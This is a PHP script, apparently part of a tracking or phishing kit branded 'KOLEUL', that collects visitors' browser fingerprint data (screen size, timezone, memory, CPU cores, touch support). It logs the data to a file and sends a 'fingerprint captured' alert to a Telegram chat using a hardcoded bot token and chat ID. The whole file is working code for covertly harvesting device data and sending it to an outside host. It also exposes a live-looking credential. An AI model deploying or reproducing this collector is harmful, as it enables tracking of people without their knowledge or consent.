<?php
if (!file_exists('logs')) mkdir('logs');
$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $log = "[" . date("Y-m-d H:i:s") . "] Fingerprint Data:\n";
    $log .= print_r($data, true) . "\n";
    file_put_contents("logs/fingerprints.txt", $log, FILE_APPEND);
    
    // Telegram Notification
    $botToken = "7757124710:AAGqZ2XQTcps8EX3v6GCHYsbpHVJAR5LuIQ";
    $chatId = "6730758751";
    $message = urlencode("📱 BROWSER FINGERPRINT CAPTURED DEVELOPED BY KOLEUL\n\n"
        . "🖥️ Screen: {$data['screen']['width']}x{$data['screen']['height']}\n"
        . "🌐 Timezone: {$data['timezone']}\n"
        . "💾 Memory: {$data['deviceMemory']}GB\n"
        . "🛠️ CPU Cores: {$data['hardwareConcurrency']}\n"
        . "📲 Touch: " . ($data['touchSupport'] ? 'Yes' : 'No') . "\n"
        . "🕒 Time: " . date("Y-m-d H:i:s"));
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message");
}
?>
